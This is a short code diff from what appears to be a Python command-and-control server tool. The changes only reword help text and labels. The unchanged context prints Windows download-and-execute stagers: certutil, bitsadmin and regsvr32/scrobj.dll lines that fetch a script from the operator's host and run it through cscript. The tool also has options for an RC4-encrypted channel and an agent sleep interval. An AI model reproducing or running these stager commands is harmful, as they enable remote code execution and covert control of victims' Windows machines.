@@ -17,7 +17,7 @@ from lib.color import BOLD
 
 
 def print_online_cmd(host, port):
-    print('[*]Execute in client:')
+    print('[*]Execute in host:')
     print('{} -urlcache -split -f http://{}:{}/init css.js && cscript //nologo css.js'.format(BOLD('certutil'), host, port))
     print('{} /transfer n http://{}:{}/init css.js && cscript //nologo css.js'.format(BOLD('bitsadmin'), host, port))
     print('{} /s /n /u /i:http://{}:{}/file.sct scrobj.dll'.format(BOLD('regsvr32'), host, port))
@@ -88,13 +88,13 @@ def main():
 
     parser = argparse.ArgumentParser()
     parser.add_argument('--host', required=True,
-                        help='host foreign ip for host connect')
+                        help='server foreign ip for host connect')
     parser.add_argument('-p', '--port', default=6600,
-                        help='host listening port,default is 6600')
+                        help='server listening port,default is 6600')
     parser.add_argument('--new_key', default=False, action="store_true",
                         help="generate new rc4 key to encrypt data")
     parser.add_argument('-s', '--sleep_time', default=5,
-                        help='set agent sleep time in second,default is 5')
+                        help='set host sleep time in second,default is 5')
     args = parser.parse_args()
 
     run(args.host, int(args.port), args.new_key, args.sleep_time)
